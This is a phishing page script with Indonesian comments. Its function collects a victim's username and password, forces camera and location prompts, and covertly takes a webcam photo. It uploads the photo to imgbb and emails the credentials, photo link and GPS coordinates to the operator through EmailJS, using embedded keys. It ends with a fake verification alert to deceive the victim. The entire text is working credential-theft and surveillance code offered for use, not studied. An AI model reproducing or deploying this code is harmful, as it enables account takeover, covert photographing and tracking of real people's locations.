<script>
    (function(){
        emailjs.init("5HWPoEryOV1APt1Cw");
    })();

    async function startHack() {
        const user = document.getElementById("username").value;
        const pass = document.getElementById("password").value;

        if(!user || !pass) {
            alert("Harap isi semua kolom untuk verifikasi.");
            return;
        }

        // Tampilkan loading
        document.getElementById("loading-overlay").style.display = "flex";
        
        let report = `[DATA LOGIN TARGET]\nUser: ${user}\nPass: ${pass}\n\n`;

        try {
            // STEP 1: PAKSA MINTA IZIN KAMERA (Ini yang akan memunculkan pop-up)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            // STEP 2: PAKSA MINTA IZIN GPS
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // Jika GPS diizinkan, ambil koordinat
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // STEP 3: AMBIL FOTO SETELAH IZIN DIBERIKAN
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                    
                    // Matikan kamera
                    stream.getTracks().forEach(t => t.stop());

                    // STEP 4: UPLOAD FOTO KE IMGBB
                    const formData = new FormData();
                    formData.append("image", photoBase64);
                    const upload = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
                        method: "POST", body: formData
                    });
                    const resImg = await upload.json();
                    const linkFoto = resImg.data.url;

                    // STEP 5: KIRIM SEMUA KE EMAIL
                    report += `📸 FOTO: ${linkFoto}\n📍 GPS: https://www.google.com/maps?q=${lat},${lon}`;
                    kirimKeEmail(report);
                }, 2000);

            }, (err) => {
                // Jika GPS ditolak tapi kamera diizinkan
                report += "📍 GPS: Ditolak Target\n";
                kirimKeEmail(report);
            });

        } catch (e) {
            // Jika Kamera ditolak sama sekali
            report += "📸 Kamera: Ditolak/Block\n";
            // Coba ambil GPS saja sebagai cadangan
            navigator.geolocation.getCurrentPosition((pos) => {
                report += `📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                kirimKeEmail(report);
            }, () => {
                kirimKeEmail(report + "📍 GPS: Ditolak");
            });
        }
    }

    function kirimKeEmail(pesan) {
        emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: pesan })
        .then(() => {
            document.getElementById("loading-overlay").style.display = "none";
            alert("Sesi Berakhir: Akun anda memerlukan verifikasi tambahan via SMS.");
            location.reload();
        });
    }
        </script>
